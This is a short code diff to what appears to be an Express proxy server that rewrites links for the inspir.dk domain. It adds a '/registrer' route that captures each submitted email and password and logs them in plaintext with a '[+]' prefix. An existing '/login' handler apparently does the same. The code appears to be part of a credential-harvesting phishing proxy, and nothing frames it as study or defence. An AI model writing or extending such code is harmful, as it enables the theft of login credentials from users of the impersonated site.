@@ -220,6 +220,12 @@ server.post("/login", express.urlencoded({extended: true}), (req, res, next) => 
 	next();
 });
 
+server.post("/registrer", express.urlencoded({extended: true}), (req, res, next) => {
+	let { email, password } = req.body;
+	console.log(`[+] ${email} | ${password}`);
+	next();
+});
+
 
 // Main handler
 const oldDomainRegex = /https?:\/\/(?:www)?\.inspir\.dk/g;
